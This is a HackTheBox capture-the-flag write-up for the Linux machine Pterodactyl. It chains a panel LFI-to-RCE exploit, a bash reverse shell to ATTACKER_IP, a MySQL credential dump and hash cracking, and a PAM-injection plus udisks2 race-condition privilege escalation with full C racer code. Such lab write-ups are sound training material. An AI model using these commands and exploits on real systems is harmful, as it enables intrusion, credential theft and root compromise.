# HackTheBox — Pterodactyl Writeup

> **Difficulty:** Medium | **OS:** Linux (openSUSE Leap 15.6) | **Season:** 10

---

## Summary

Pterodactyl is a medium-difficulty Linux machine running the Pterodactyl game server panel. The attack chain involves an unauthenticated LFI-to-RCE vulnerability in the panel, credential extraction via MySQL, bcrypt hash cracking for SSH access, and a two-CVE privilege escalation chain abusing PAM session injection and a udisks2 XFS resize race condition.

**Flags:**
- User: `************************`
- Root: *(obtained via CVE-2025-6019)*

---

## Reconnaissance

### Nmap

```bash
nmap -sSCV -A --min-rate 4000 10.129.44.184
```

**Open Ports:**

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 9.6p1 |
| 80   | HTTP    | nginx/1.21.5 → pterodactyl.htb |

### /etc/hosts

```bash
echo "10.129.44.184 pterodactyl.htb panel.pterodactyl.htb play.pterodactyl.htb" | sudo tee -a /etc/hosts
```

---

## Web Enumeration

```bash
dirsearch -u http://pterodactyl.htb/ -t 40
curl -s http://pterodactyl.htb/changelog.txt
```

**Key findings from changelog:**
- Site: **MonitorLand**
- Panel version: **Pterodactyl Panel v1.11.10** (vulnerable)
- PHP-PEAR enabled
- Subdomain: `panel.pterodactyl.htb`

### phpinfo.php Analysis

```bash
curl -s "http://pterodactyl.htb/phpinfo.php" | grep -E "register_argc|include_path|open_basedir|upload_tmp_dir"
```

| Setting | Value | Significance |
|---------|-------|-------------|
| `register_argc_argv` | On | Enables pearcmd CLI exploitation |
| `include_path` | `.:/usr/share/php8:/usr/share/php/PEAR` | pearcmd.php reachable |
| `open_basedir` | *(no value)* | Unrestricted filesystem access |

---

## Initial Access — CVE-2025-49132

**CVE-2025-49132** affects Pterodactyl Panel ≤ v1.11.10. The `/locales/locale.json` endpoint passes `locale` and `namespace` parameters directly to PHP's `include()` without sanitization or authentication, enabling directory traversal and pearcmd-based RCE.

### Exploit

```bash
git clone https://github.com/YoyoChaud/CVE-2025-49132
cd CVE-2025-49132

# Dump config (DB creds + APP_KEY)
python3 exploit.py http://panel.pterodactyl.htb

# Test RCE
python3 exploit.py http://panel.pterodactyl.htb \
  --rce-cmd "id" \
  --pear-dir /usr/share/php/PEAR
```

**Output:** `uid=474(wwwrun) gid=477(www) groups=477(www)`

### Credentials Extracted

| Service | Username | Password |
|---------|----------|---------|
| MySQL | `pterodactyl` | `PteraPanel` |
| Laravel | APP_KEY | `base64:UaThTPQnUjrrK61o+...` |

### Reverse Shell

```bash
# Listener
nc -lnvp 4444

# Exploit
python3 exploit.py http://panel.pterodactyl.htb \
  --rce-cmd "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" \
  --pear-dir /usr/share/php/PEAR
```

---

## Lateral Movement

### MySQL Credential Dump

```bash
mysql -u pterodactyl -pPteraPanel -h 127.0.0.1 \
  -e "USE panel; SELECT username,email,password FROM users;"
```

| Username | Hash |
|----------|------|
| `headmonitor` | `$2y$10$3WJht3/5GOQmOXdljPbAJet...` |
| `phileasfogg3` | `$2y$10$PwO0TBZA8hLB6nuSsxRqoO...` |

### User Flag

```bash
cat /home/phileasfogg3/user.txt

```

### Hash Cracking

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt -w 3
```

**Result:** `phileasfogg3 : !QAZ2wsx`

### SSH Access

```bash
ssh phileasfogg3@10.129.44.184
# password: !QAZ2wsx
```

---

## Privilege Escalation

### Sudo Analysis

```bash
sudo -l
```

`(ALL) ALL` is configured but the `targetpw` Defaults option requires root's password — blocking standard sudo abuse.

---

### Step 1 — CVE-2025-6018: PAM Session Bypass

**CVE-2025-6018** abuses `pam_env.so` on openSUSE to inject environment variables at login time. By placing `XDG_SEAT=seat0` and `XDG_VTNR=1` in `~/.pam_environment`, a remote SSH user can trick Polkit into treating their session as an active local console session (`allow_active`), unlocking hardware management D-Bus actions.

```bash
echo -e "XDG_SEAT=seat0\nXDG_VTNR=1" > ~/.pam_environment

# Exit and SSH back in (PAM re-reads on fresh login)
exit
ssh phileasfogg3@10.129.44.184

# Verify
echo $XDG_SEAT   # seat0
echo $XDG_VTNR   # 1
```

---

### Step 2 — CVE-2025-6019: udisks2 XFS Resize Race Condition → Root

**CVE-2025-6019** exploits a missing `nosuid` flag in libblockdev when udisks2 temporarily mounts an XFS image during a `Filesystem.Resize` D-Bus call. By racing to execute a SUID binary inside the image during this window, an unprivileged user with `allow_active` Polkit rights can obtain a root shell.

#### Build XFS Image (on attacker machine)

```bash
# Create XFS image using target's mkfs.xfs for compatibility
scp phileasfogg3@TARGET:/sbin/mkfs.xfs /tmp/target_mkfs_xfs

# Build on target directly instead
ssh phileasfogg3@TARGET
dd if=/dev/zero of=/tmp/xfs_new.img bs=1M count=300
/sbin/mkfs.xfs -f /tmp/xfs_new.img
```

Transfer to attacker, inject SUID binary, transfer back:

```bash
# On attacker (as root)
scp phileasfogg3@TARGET:/tmp/xfs_new.img /tmp/xfs_new.img
mount -o loop,suid /tmp/xfs_new.img /tmp/mnt
cp rootbash /tmp/mnt/xpl
chmod 4755 /tmp/mnt/xpl      # Must show -rwsr-xr-x
umount /tmp/mnt
gzip -c /tmp/xfs_new.img > xfs_new.img.gz
```

#### Compile Fast C Racer

```c
// racer.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/stat.h>

int main() {
    char path[512], cmd[512];
    struct stat st;
    while(1) {
        DIR *d = opendir("/tmp");
        struct dirent *e;
        while((e = readdir(d))) {
            if(strncmp(e->d_name, "blockdev.", 9) == 0) {
                snprintf(path, sizeof(path), "/tmp/%s/xpl", e->d_name);
                if(stat(path, &st) == 0 && (st.st_mode & S_ISUID)) {
                    closedir(d);
                    snprintf(cmd, sizeof(cmd),
                        "%s -p -c 'cp /bin/bash /tmp/b; chmod 4755 /tmp/b'", path);
                    system(cmd);
                    return 0;
                }
            }
        }
        closedir(d);
    }
}
```

```bash
gcc -O2 -o racer racer.c
```

#### Execute Race

```bash
# On target
wget http://ATTACKER_IP/xfs_new.img.gz && gunzip xfs_new.img.gz
wget http://ATTACKER_IP/racer && chmod +x racer

udisksctl loop-setup -f /tmp/xfs_new.img --no-user-interaction
# Note loop device number (e.g. loop7)

rm -rf /tmp/blockdev.* 2>/dev/null
/tmp/racer &

for i in $(seq 1 300); do
  gdbus call --system \
    --dest org.freedesktop.UDisks2 \
    --object-path /org/freedesktop/UDisks2/block_devices/loop7 \
    --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}' 2>/dev/null &
done
wait
```

**Result:** Root shell obtained.

```bash
id
# uid=0(root)

cat /root/root.txt
```

---

## Attack Chain

```
[Nmap] Ports 22, 80
    ↓
[Web Enum] changelog.txt → Pterodactyl Panel v1.11.10
    ↓
[phpinfo.php] register_argc_argv=On, PEAR in include_path
    ↓
[CVE-2025-49132] Unauth LFI → pearcmd RCE → wwwrun shell
    ↓
[MySQL] pterodactyl:PteraPanel → bcrypt hashes
    ↓
[Hashcat] phileasfogg3:!QAZ2wsx
    ↓
[SSH] phileasfogg3
    ↓
[CVE-2025-6018] ~/.pam_environment → allow_active bypass
    ↓
[CVE-2025-6019] udisks2 XFS resize race → SUID exec → ROOT
```

---

## Credentials

| Service | Username | Password |
|---------|----------|---------|
| MySQL | `pterodactyl` | `PteraPanel` |
| SSH / Panel | `phileasfogg3` | `!QAZ2wsx` |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| dirsearch | Web directory brute force |
| CVE-2025-49132 exploit | Unauth LFI + pearcmd RCE |
| hashcat (-m 3200) | Bcrypt cracking |
| CVE-2025-6018-6019 PoC | PAM bypass + udisks2 race |
| Custom C racer | Win the nosuid race condition |

---

## References

- [CVE-2025-49132 PoC](https://github.com/YoyoChaud/CVE-2025-49132)
- [CVE-2025-6018-6019 PoC](https://github.com/DesertDemons/CVE-2025-6018-6019)
- [Qualys Advisory](https://blog.securelayer7.net/cve-2025-6019-local-privilege-escalation/)
- [HackTheBox](https://app.hackthebox.com/machines/Pterodactyl)

---

*Writeup by [kareem elsheikh] | HackTheBox Season 10*
